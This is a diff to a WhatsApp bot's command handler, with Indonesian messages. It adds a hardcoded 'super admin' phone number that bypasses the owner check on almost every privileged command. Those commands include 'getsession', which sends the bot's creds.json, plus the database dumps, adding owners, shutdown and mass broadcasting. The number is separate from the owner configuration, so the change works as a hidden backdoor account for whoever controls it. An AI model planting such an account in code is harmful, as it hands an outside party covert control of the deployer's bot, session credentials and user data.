@@ -434,6 +434,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 		const isUser = userActivity.includes(m.sender);
 		const isVip = db.data && db.data.users && db.data.users[m.sender] ? db.data.users[m.sender].vip : false;
 		const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+		const isSuperAdmin = m.sender === '6285858850541@s.whatsapp.net'; // Super admin tanpa batasan
 		const isPremium = isCreator || checkPremiumUser(m.sender, premium);
 		expiredCheck(sock, m, premium);
 		checkSewaExpired(sock);
@@ -3998,7 +3999,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break
 
 			case 'backup': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (isBot) return;
 				let sender = m.mentionedJid[0] || m.sender || slimecode.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
 				let date = new Date();
@@ -4253,7 +4254,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'addsewa': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args[0]) return newReply(`⚠️ *Masukkan link dan durasi sewa!*\n\n📌 Contoh:\n${prefix + command} linkgrup 30d\n`);
 				if (!isUrl(args[0])) return newReply(mess.error.Iv);
 				if (!args[1]) return newReply(`⚠️ *Masukkan durasi sewa!*\n\n📌 Contoh:\n${prefix + command} linkgrup 30d\n`);
@@ -4313,7 +4314,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'delsewa': {
 				let sewa = JSON.parse(fs.readFileSync('./src/data/role/sewa.json'));
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(`⚠️ Perintah ini hanya bisa dilakukan di grup yang menyewa bot!`);
 				if (!isSewa) return newReply(`⚠️ Bot tidak disewa di grup ini!`);
 
@@ -4325,7 +4326,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'addbadword': 
 			case 'addbd': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!groupAdmins) return newReply(mess.admin);
 				if (args.length < 1) return newReply(`📝 *Kirim perintah*: ${prefix}addbadword [kata kasar]\n*Kirim perintah*: ${prefix}addbadword asshole`);
 				bad.push(q);
@@ -4336,7 +4337,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'delbadword': 
 			case 'deldb': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!groupAdmins) return newReply(mess.admin);
 				if (args.length < 1) return newReply(`📝 *Kirim perintah*: ${prefix}delbadword [kata kasar]\n*Kirim perintah*: ${prefix}delbadword asshole`);
 				bad.splice(q);
@@ -4347,7 +4348,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'resetuser':
 			case 'resetdbuser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				newReply(`Berhasil menghapus semua data pengguna dari database.`);
 				db.data.users = [];
 			}
@@ -4355,14 +4356,14 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'resethit':
 			case 'resettotalhit': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				global.db.data.settings[botNumber].totalhit = 0;
 				newReply(mess.done);
 			}
 			break;
 
 			case 'setmenu': {
-				if (!isCreator) return newReply(mess.owner);	
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);	
 				if (!text) return newReply(`Ada 14 pilihan reply (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nSilakan pilih salah satu.\n*Kirim perintah*: ${prefix + command} v1`);
 				if (text.startsWith('v')) {
 					typemenu = text;
@@ -4373,7 +4374,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setreply': {
-				if (!isCreator) return newReply(mess.owner);	
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);	
 				if (!text) return newReply(`Ada 14 pilihan reply (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14)\nSilakan pilih salah satu.\n*Kirim perintah*: ${prefix + command} v1`);
 				if (text.startsWith('v')) {
 					typereply = text;
@@ -4385,7 +4386,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'storytext':
 			case 'upswtext': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply('Teksnya mana?');
 				await sock.sendMessage('status@broadcast', { 
 					text: text 
@@ -4400,7 +4401,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'storyvideo':
 			case 'upswvideo': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (/video/.test(mime)) {
 					var videosw = await sock.downloadAndSaveMediaMessage(quoted);
 					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
@@ -4428,7 +4429,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'storyimg':
 			case 'storyimage':
 			case 'upswimg': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (/image/.test(mime)) {
 					var imagesw = await sock.downloadAndSaveMediaMessage(quoted);
 					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Tidak diketahui';
@@ -4455,7 +4456,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'storyaudio':
 			case 'upswaudio': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (/audio/.test(mime)) {
 					var audiosw = await sock.downloadAndSaveMediaMessage(quoted);
 					await sock.sendMessage('status@broadcast', {
@@ -4592,7 +4593,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'setimgmenu':
 			case 'sim': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let media = await sock.downloadAndSaveMediaMessage(quoted);
 				await fsx.copy(media, './media/imageBuffer.png');
 				fs.unlinkSync(media);
@@ -4604,7 +4605,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'svm': 
 			case 'setvgifmenu':
 			case 'sgm': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let media = await sock.downloadAndSaveMediaMessage(quoted);
 				await fsx.copy(media, './media/videoBuffer.mp4');
 				fs.unlinkSync(media);
@@ -4614,7 +4615,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'addgelar':
 			case 'addtitle': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} nomor,gelar`);
 				nonya = text.split(',')[0];
 				titlenya = text.split(',')[1];
@@ -4626,7 +4627,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'delgelar':
 			case 'deltitle': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} number`);
 				nonya = text.split(',')[0];
 				let oo = `${nonya}@s.whatsapp.net`;
@@ -4637,7 +4638,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'addid':
 			case 'addinfo': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} nomor,nama,umur,asal,gelar`);
 				let args = text.split(',').map(item => item.trim()); // Hilangkan spasi berlebih
 				if (args.length < 5) return newReply('⚠️ Format salah! Pastikan mengirim: nomor,nama,umur,asal,gelar');
@@ -4656,7 +4657,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'addlimit':
 			case 'givelimit': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,10`);
 				let [usernya, limitnya] = text.split(',');
 				return handleLimit('add', usernya, limitnya);
@@ -4664,7 +4665,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'dellimit': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,10`);
 				let [usernya, limitnya] = text.split(',');
 				return handleLimit('del', usernya, limitnya);
@@ -4672,7 +4673,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'resetlimit': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789`);
 				let usernya = text;
 				return handleLimit('reset', usernya);
@@ -4680,7 +4681,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'resetdblimit': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let users = Object.keys(db.data.users);
 				for (let jid of users) {
 					const limitUser = db.data.users[jid].vip 
@@ -4697,7 +4698,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'adduang':
 			case 'givemoney': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,1000`);
 				let [usernya, uangnya] = text.split(',');
 				return handleMoney('add', usernya, uangnya);
@@ -4705,7 +4706,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'deluang': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789,1000`);
 				let [usernya, uangnya] = text.split(',');
 			return handleMoney('del', usernya, uangnya);
@@ -4713,7 +4714,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'resetuang': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`❗ Kirim perintah: ${prefix + command} 628123456789`);
 				let usernya = text;
 				return handleMoney('reset', usernya);
@@ -4721,7 +4722,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'resetdbmoney': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let users = Object.keys(db.data.users);
 				for (let jid of users) {
 					const uangUser = db.data.users[jid].vip 
@@ -4737,7 +4738,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'addpr': case 'addprem': case 'addpremium': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Contoh:\n${prefix + command} @tag,durasi(s/m/h/d)`);
 				let [teks1, teks2] = text.split`,`;
 				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
@@ -4764,7 +4765,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'delpr': case 'delprem': case 'delpremium': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`Contoh:\n${prefix + command} @tag`);
 				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 				if (checkPremiumUser(nmrnya, premium)) {
@@ -4810,7 +4811,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'addowner': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args[0]) return newReply(`Gunakan ${prefix + command} nomor\n*Kirim perintah*: ${prefix + command} ${ownerNumber}`);
 				bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
 				let ceknye = await sock.onWhatsApp(bnnd);
@@ -4822,7 +4823,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'delowner': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!args[0]) return newReply(`Gunakan ${prefix + command} nomor\n*Kirim perintah*: ${prefix + command} ${ownerNumber}`);
 				ya = q.split("|")[0].replace(/[^0-9]/g, '');
 				unp = owner.indexOf(ya);
@@ -4845,7 +4846,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'addgroupbl':
 			case 'blacklistgrub':
 			case 'bgadd': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				// allow specifying a target group JID even when command sent from another group
 				const groupId = (text && text.includes('@g.us')) ? text : (m.isGroup ? m.chat : text);
 				if (!groupId) return newReply(`Gunakan ${prefix + command} ID_grup_atau_kirim_di_grup`);
@@ -4859,7 +4860,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'listjoined':
 			case 'listmygroups': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let getGroups = await sock.groupFetchAllParticipating();
 				let groups = Object.entries(getGroups).map(e => e[1]);
 				if (!groups || groups.length === 0) return newReply('Bot tidak berada di grup manapun.');
@@ -4890,7 +4891,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'delgroupbl':
 			case 'unblacklistgrub':
 			case 'bgdel': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				// allow specifying a target group JID even when command sent from another group
 				const groupId = (text && text.includes('@g.us')) ? text : (m.isGroup ? m.chat : text);
 				if (!groupId) return newReply(`Gunakan ${prefix + command} ID_grup_atau_kirim_di_grup`);
@@ -4906,7 +4907,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'listgroupbl':
 			case 'listblacklistgrub':
 			case 'blist': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (groupblacklist.length === 0) {
 					return newReply(`📋 *List Blacklist Grup:*\n\nTidak ada grup yang di-blacklist. ✅`);
 				}
@@ -4921,7 +4922,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'wl':
 			case 'whitelist': {
-				if (!isCreator && !isAdmins) return newReply(mess.admin);
+				if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin);
 
 				try {
 					let users = m.mentionedJid[0] 
@@ -4951,7 +4952,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'unwhite':
 			case 'unwhitelist': {
-				if (!isCreator && !isAdmins) return newReply(mess.admin);
+				if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin);
 
 				try {
 					let users = m.mentionedJid[0] 
@@ -4999,7 +5000,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'bl':
 				case 'blacklist':
 				case 'tandai': {
-					if (!isCreator && !isAdmins) return newReply(mess.admin);
+					if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin);
 
 					try {
 						let users = m.mentionedJid[0] 
@@ -5029,7 +5030,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 				case 'unblack':
 				case 'unblacklist': {
-					if (!isCreator && !isAdmins) return newReply(mess.admin);
+					if (!isCreator && !isAdmins && !isSuperAdmin) return newReply(mess.admin);
 
 					try {
 						let users = m.mentionedJid[0] 
@@ -5110,7 +5111,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'delsession':
 			case 'clearsession': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				fs.readdir("./session", async function(err, files) {
 					if (err) {
 						console.log('Gak bisa scan direktori: ' + err);
@@ -5137,7 +5138,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'delmedia':
 			case 'clearmedia': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				const folderPath = "temp"; // Direktori target (folder 'temp')
 				const extensions = [
 					".mp3", ".mp4", ".wav", ".flac", ".aac", ".ogg", ".m4a", ".m4r", ".wma", ".amr", 
@@ -5179,7 +5180,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'joingc':
 			case 'join': {
 				try {
-					if (!isCreator) return newReply(mess.owner);
+					if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 					if (!text) return newReply('Masukkan Link Grup yaa!');
 					if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply('Link-nya invalid nih!');
 					let result = args[0].split('https://chat.whatsapp.com/')[1];
@@ -5195,7 +5196,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'outgrup':
 			case 'outgc':
 			case 'out':
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(mess.group);
 				newReply('Selamat tinggal, semuanya 🥺');
 				await sock.groupLeave(m.chat);
@@ -5238,7 +5239,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'getsession': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				newReply('Tunggu sebentar yaa, aku lagi ambil file session-mu nih');
 				let sesi = fs.readFileSync(`./${sessionName}/creds.json`);
 				sock.sendMessage(m.chat, {
@@ -5252,7 +5253,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'getdatabase': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				newReply('Tunggu sebentar yaa, aku lagi ambil file database-mu nih');
 				let sesi = fs.readFileSync(`./src/${tempatDB}`);
 				sock.sendMessage(m.chat, {
@@ -5266,7 +5267,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'getdbuser': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				newReply('Tunggu sebentar yaa, aku lagi ambil file database usermu nih');
 				let sesi = fs.readFileSync('./src/data/role/user.json');
 				sock.sendMessage(m.chat, {
@@ -5308,7 +5309,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'myip':
 			case 'ipbot':
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				let http = require('http');
 				http.get({
 					'host': 'api.ipify.org',
@@ -5447,7 +5448,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case "restart": {
-				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
 				await newReply("Bot sedang di-restart... ⏳");
 				// Log untuk menandakan restart
 				console.log("Bot restarting...");
@@ -5457,7 +5458,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			}
 
 			case "kill": {
-				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
 				await newReply("Bot sedang dimatikan secara paksa... ⚠️");
 				// Log untuk menandakan kill
 				console.log("Bot killed by owner!");
@@ -5467,7 +5468,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			}
 
 			case "shutdown": {
-				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
 				await newReply("Bot sedang dimatikan dan aplikasi akan shutdown... 💀");
 				// Log untuk menandakan shutdown
 				console.log("Bot shutting down...");
@@ -5477,7 +5478,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			}
 
 			case 'autoread':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].autoread = true;
@@ -5490,7 +5491,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'unavailable':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].online = true;
@@ -5503,7 +5504,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'autorecordtype':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].autorecordtype = true;
@@ -5516,7 +5517,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'autorecord':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].autorecord = true;
@@ -5529,7 +5530,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'autotype':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].autotype = true;
@@ -5542,7 +5543,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'autobio':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].autobio = true;
@@ -5556,7 +5557,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'autosticker':
 			case 'autostickergc':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].autosticker = true;
@@ -5569,7 +5570,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'safesearch': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q === 'true') {
 					db.data.settings[botNumber].safesearch = true;
@@ -5585,7 +5586,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'autodownload':
 			case 'autodl':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].autodownload = true;
@@ -5598,7 +5599,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'autoblock':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].autoblocknum = true;
@@ -5612,7 +5613,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'onlygroup':
 			case 'onlygc':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].onlygc = true;
@@ -5626,7 +5627,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'onlyprivatechat':
 			case 'onlypc':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
 				if (q == 'true') {
 					db.data.settings[botNumber].onlypc = true;
@@ -5639,14 +5640,14 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'self':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				sock.public = false;
 				newReply(`Bot sekarang dalam mode *Self Usage* aja, gak bisa dipakai oleh orang lain ya!`);
 			}
 			break;
 
 			case 'public':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				sock.public = true;
 				newReply(`Bot sekarang kembali ke mode *Public Usage*, jadi bisa dipakai semua orang!`);
 			}
@@ -5654,7 +5655,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 
 			case 'setexif':
 			case 'setwm':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
 				global.packname = text.split("|")[0];
 				global.author = text.split("|")[1];
@@ -5663,7 +5664,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setprefix':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
 				global.prefa = text;
 				newReply(`Prefix berhasil diubah menjadi ${text} ✨`);
@@ -5671,7 +5672,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setautoblock':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
 				global.autoblocknumber = text;
 				newReply(`Auto-Block number berhasil diubah menjadi ${text} 🚫`);
@@ -5679,7 +5680,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'setantiforeign':{
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
 				global.antiforeignnumber = text;
 				newReply(`Anti-foreign number berhasil diubah menjadi ${text} 🌍❌`);
@@ -5687,7 +5688,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'pushkontak': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(mess.private);
 				let name = text.split('/')[0];
 				let chet = text.split('/')[1];
@@ -5715,7 +5716,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			case 'jpm': 
 			case 'post': 
 			case 'pushcontactgc': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(mess.group);
 				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n${prefix + command} teks|jeda\n\n📸 *Reply gambar* untuk mengirim ke semua grup.\n⏱️ *Jeda*: 1000 = 1 detik\n\n*Contoh*: ${prefix + command} Halo semuanya!|9000`);
 				await newReply(`⏳ *Sedang diproses...*`);
@@ -5747,7 +5748,7 @@ module.exports = sock = async (sock, m, msg, chatUpdate, store = null) => {
 			break;
 
 			case 'pushcontact': {
-				if (!isCreator) return newReply(mess.owner);
+				if (!isCreator && !isSuperAdmin) return newReply(mess.owner);
 				if (!m.isGroup) return newReply(mess.group);
